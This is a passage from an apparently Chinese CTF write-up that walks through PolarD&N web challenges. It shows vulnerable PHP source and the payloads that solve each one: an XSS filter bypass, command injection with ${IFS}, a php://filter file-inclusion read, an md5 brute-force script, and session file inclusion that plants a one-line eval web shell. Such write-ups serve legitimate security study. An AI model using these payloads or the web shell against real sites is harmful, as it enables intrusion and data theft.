operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>compatible<span class="token punctuation">;</span> Googlebot<span class="token operator">/</span><span class="token number">2.1</span><span class="token punctuation">;</span> <span class="token operator">+</span>http<span class="token punctuation">:</span><span class="token comment">//www.google.com/bot.html)</span>Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>compatible<span class="token punctuation">;</span> YandexAccessibilityBot<span class="token operator">/</span><span class="token number">3.0</span><span class="token punctuation">;</span> <span class="token operator">+</span>http<span class="token punctuation">:</span><span class="token comment">//yandex.com/bots)</span><span class="token comment"># Â∫ì‰∏éÁΩëÁªúÂ∑•ÂÖ∑ÁöÑÁî®Êà∑‰ª£ÁêÜÂ≠óÁ¨¶‰∏≤</span>PostmanRuntime<span class="token operator">/</span><span class="token number">7.26</span><span class="token number">.5</span>curl<span class="token operator">/</span><span class="token number">7.64</span><span class="token number">.1</span><span class="token comment"># ÂæÆËΩØ Edge Áî®Êà∑‰ª£ÁêÜÂ≠óÁ¨¶‰∏≤</span>Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>Windows <span class="token constant">NT</span> <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span><span class="token constant">KHTML</span><span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Chrome<span class="token operator">/</span><span class="token number">91.0</span><span class="token number">.4472</span><span class="token number">.124</span> Safari<span class="token operator">/</span><span class="token number">537.36</span> Edg<span class="token operator">/</span><span class="token number">91.0</span><span class="token number">.864</span><span class="token number">.59</span><span class="token comment"># Opera Áî®Êà∑‰ª£ÁêÜÂ≠óÁ¨¶‰∏≤</span>Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token constant">X11</span><span class="token punctuation">;</span> Linux x86_64<span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span><span class="token constant">KHTML</span><span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Chrome<span class="token operator">/</span><span class="token number">51.0</span><span class="token number">.2704</span><span class="token number">.106</span> Safari<span class="token operator">/</span><span class="token number">537.36</span> <span class="token constant">OPR</span><span class="token operator">/</span><span class="token number">38.0</span><span class="token number">.2220</span><span class="token number">.41</span><span class="token comment"># Chrome Áî®Êà∑‰ª£ÁêÜÂ≠óÁ¨¶‰∏≤</span>Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token constant">X11</span><span class="token punctuation">;</span> Linux x86_64<span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span><span class="token constant">KHTML</span><span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Chrome<span class="token operator">/</span><span class="token number">51.0</span><span class="token number">.2704</span><span class="token number">.103</span> Safari<span class="token operator">/</span><span class="token number">537.36</span><span class="token comment"># Firefox Áî®Êà∑‰ª£ÁêÜÂ≠óÁ¨¶‰∏≤</span>Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>platform<span class="token punctuation">;</span> rv<span class="token punctuation">:</span>geckoversion<span class="token punctuation">)</span> Gecko<span class="token operator">/</span>geckotrail Firefox<span class="token operator">/</span>firefoxversion</code></pre><h4 id="ÊµÆÁîüÊó•ËÆ∞-xss"><a href="#ÊµÆÁîüÊó•ËÆ∞-xss" class="headerlink" title="ÊµÆÁîüÊó•ËÆ∞(xss)"></a>ÊµÆÁîüÊó•ËÆ∞(xss)</h4><p><img src="xss.png" loading="lazy"></p><p>ÊúâÁÇπÂÉèxss‰ΩÜÊòØËøáÊª§‰∫ÜÂü∫Êú¨ÁöÑ</p><p><img src="xss_2.png" loading="lazy"></p><p>ÂÖàÈó≠Âêà<code>&quot;</code>ÁÑ∂ÂêéÂú®ÂèåÂÜôËØïËØï</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">"<span class="token operator">></span><span class="token operator">&lt;</span>scrscriptipt<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>scrscriptipt<span class="token operator">></span></code></pre><h4 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="$$(GLOBALS)"></a>$$(GLOBALS)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*PolarD&amp;N CTF*/</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag|\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"oh on!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"var_dump(<span class="token interpolation"><span class="token variable">$$a</span></span>);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$GLOBALS</span>ÔºöÂºïÁî®ÂÖ®Â±Ä‰ΩúÁî®Âüü‰∏≠ÂèØÁî®ÁöÑÂÖ®ÈÉ®ÂèòÈáèÔºà‰∏Ä‰∏™ÂåÖÂê´‰∫ÜÂÖ®ÈÉ®ÂèòÈáèÁöÑÂÖ®Â±ÄÁªÑÂêàÊï∞ÁªÑ„ÄÇÂèòÈáèÁöÑÂêçÂ≠óÂ∞±ÊòØÊï∞ÁªÑÁöÑÈîÆÔºâÔºå‰∏éÊâÄÊúâÂÖ∂‰ªñË∂ÖÂÖ®Â±ÄÂèòÈáè‰∏çÂêåÔºå<span class="token variable">$GLOBALS</span>Âú®<span class="token constant">PHP</span>‰ª£Á†Å‰∏≠‰ªª‰ΩïÂú∞ÊñπÊÄªÊòØÂèØÁî®ÁöÑ<span class="token keyword">global</span>Âú®<span class="token constant">PHP</span>‰∏≠ÁöÑËß£ÊûêÊòØÔºö<span class="token keyword">global</span>ÁöÑ‰ΩúÁî®ÊòØÂÆö‰πâÂÖ®Â±ÄÂèòÈáè<span class="token punctuation">,</span>‰ΩÜÊòØËøô‰∏™ÂÖ®Â±ÄÂèòÈáè‰∏çÊòØÂ∫îÁî®‰∫éÊï¥‰∏™ÁΩëÁ´ô<span class="token punctuation">,</span>ËÄåÊòØÂ∫îÁî®‰∫éÂΩìÂâçÈ°µÈù¢<span class="token punctuation">,</span>ÂåÖÊã¨<span class="token keyword">include</span>Êàñ<span class="token keyword">require</span>ÁöÑÊâÄÊúâÊñá‰ª∂„ÄÇÊ≥®ÔºöÂú®ÂáΩÊï∞‰ΩìÂÜÖÂÆö‰πâÁöÑ<span class="token keyword">global</span>ÂèòÈáè<span class="token punctuation">,</span>ÂáΩÊï∞‰ΩìÂ§ñÂèØ‰ª•‰ΩøÁî®<span class="token punctuation">,</span>Âú®ÂáΩÊï∞‰ΩìÂ§ñÂÆö‰πâÁöÑ<span class="token keyword">global</span>ÂèòÈáè‰∏çËÉΩÂú®ÂáΩÊï∞‰ΩìÂÜÖ‰ΩøÁî®</code></pre><h4 id="ÁàÜÁ†¥"><a href="#ÁàÜÁ†¥" class="headerlink" title="ÁàÜÁ†¥"></a>ÁàÜÁ†¥</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span><span class="token comment">#62‰Ωç</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$a</span> <span class="token operator">&lt;</span> <span class="token number">62</span><span class="token punctuation">;</span> <span class="token variable">$a</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$b</span> <span class="token operator">&lt;</span> <span class="token number">62</span><span class="token punctuation">;</span> <span class="token variable">$b</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token variable">$string</span><span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token variable">$string</span><span class="token punctuation">[</span><span class="token variable">$b</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token variable">$flag</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><h4 id="XFF"><a href="#XFF" class="headerlink" title="XFF"></a>XFF</h4><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">X-Forwarded-For</span><span class="token punctuation">:</span> <span class="token header-value">1.1.1.1</span></span></code></pre><h4 id="rce1"><a href="#rce1" class="headerlink" title="rce1"></a>rce1</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ /"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ping -c 4 <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$ip</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span>        <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">/</span><span class="token operator">?</span>ip<span class="token operator">=</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">;</span><span class="token class-name type-declaration">tac</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token constant">IFS</span><span class="token punctuation">&#125;</span>fllllaaag<span class="token operator">.</span>php<span class="token comment">#</span></code></pre><h4 id="GET-POST"><a href="#GET-POST" class="headerlink" title="GET-POST"></a>GET-POST</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">/*PolarD&amp;N CTF*/</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Êñá‰ª∂ÂåÖÂê´ÔºåflagÂú®flag.phpÊñá‰ª∂‰∏≠Ôºå‰∏çÁî®ÊÉ≥‰∫Ü‰Ω†ËÆøÈóÆ‰πüÊ≤°Áî®</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"‰Ω†ÂøÖÈ°ªËÆ©ÊàëÊÑüÂèóÂà∞‰Ω†ÁöÑÁúüËØöÔºåÁî®GETËØ∑Ê±Ç‰º†ÈÄí‰∏Ä‰∏ãidÂêßÔºå‰ª§id=1"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$id</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Âπ≤ÁöÑÊºÇ‰∫Æ"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br/>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ËôΩÁÑ∂ÊàëÊÑüÂèóÂà∞‰∫Ü‰Ω†ÁöÑÁúüËØöÔºå‰ΩÜËøòÊòØ‰∏çË°åÔºåÁî®POSTËØ∑Ê±Ç‰º†ÈÄí‰∏Ä‰∏ãjljcxyÂêßÔºå‰ª§jljcxy=flag"</span><span class="token punctuation">;</span>    <span class="token variable">$jljcxy</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'jljcxy'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$jljcxy</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>‰Ω†ÂøÖÈ°ªËÆ©ÊàëÊÑüÂèóÂà∞‰Ω†ÁöÑÁúüËØöÔºåÁî®<span class="token constant">GET</span>ËØ∑Ê±Ç‰º†ÈÄí‰∏Ä‰∏ãidÂêßÔºå‰ª§id<span class="token operator">=</span><span class="token number">1</span></span></code></pre><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token constant">POST</span><span class="token punctuation">:</span> jljcxy<span class="token operator">=</span>flag</code></pre><h4 id="Ë¢´ÈªëÊéâÁöÑÁ´ô"><a href="#Ë¢´ÈªëÊéâÁöÑÁ´ô" class="headerlink" title="Ë¢´ÈªëÊéâÁöÑÁ´ô"></a>Ë¢´ÈªëÊéâÁöÑÁ´ô</h4><p><img src="hacked_web.png" loading="lazy"></p><p><code>index.php.bak</code>ÈáåÈÉΩÊòØÂº±Âè£‰ª§ ÂéªÁàÜÁ†¥shell.phpÁöÑÂØÜÁ†ÅÂç≥ÂèØ</p><h4 id="Á≠æÂà∞È¢ò"><a href="#Á≠æÂà∞È¢ò" class="headerlink" title="Á≠æÂà∞È¢ò"></a>Á≠æÂà∞È¢ò</h4><p>ÂèëÁé∞cookie‰º†‰∫Ü<code>didi=no</code>Êîπ‰∏∫yesËøîÂõû‰∫Übase64Â≠óÁ¨¶ Ëß£ÂØÜÂæóÂà∞Ë∑ØÂæÑ<code>./data/index.php</code></p><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'../'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> </code></pre><p>Áõ¥Êé•‰º™ÂçèËÆÆËØªÂèñ<code>?file=php://filter/read=convert.base64-encode/resource=/flag</code></p><h4 id="Á≠æÂà∞"><a href="#Á≠æÂà∞" class="headerlink" title="Á≠æÂà∞"></a>Á≠æÂà∞</h4><p><img src="qiandao.png" loading="lazy"></p><p>Êèê‰∫§ÊåâÈíÆÊää<code>disabled</code>Âà†‰∫Ü ÂÜçÊ¨°Êèê‰∫§ÂæóÂà∞ÊèêÁ§∫</p><p>Êèê‰∫§<code>key=ilovejljcxy</code>Âç≥ÂèØ</p><h4 id="sessionÊñá‰ª∂ÂåÖÂê´"><a href="#sessionÊñá‰ª∂ÂåÖÂê´" class="headerlink" title="sessionÊñá‰ª∂ÂåÖÂê´"></a>sessionÊñá‰ª∂ÂåÖÂê´</h4><p>action.phpÁõÆÂΩïÂèØ‰ª•Êñá‰ª∂ÂåÖÂê´</p><p>‰º™ÂçèËÆÆËØªÂèñÊ∫êÁ†Å</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>&lt;a href=action.php?file=1.txt>my dairy<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>&lt;a href=action.php?file=2.txt>my booklist<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php">GET: ?file=/tmp/sess_iicon09s8aj9rhenj3rn6lhqj2POST: name=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hsad'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span></code></pre><h4 id="Don‚Äôt-touch-me"><a href="#Don‚Äôt-touch-me" class="headerlink" title="Don‚Äôt touch me"></a>Don‚Äôt touch me</h4><p>SignIn</p><h4 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h4><p>SignIn</p><h4 id="php-very-nice"><a href="#php-very-nice" class="headerlink" title="php very nice"></a>php very nice</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span 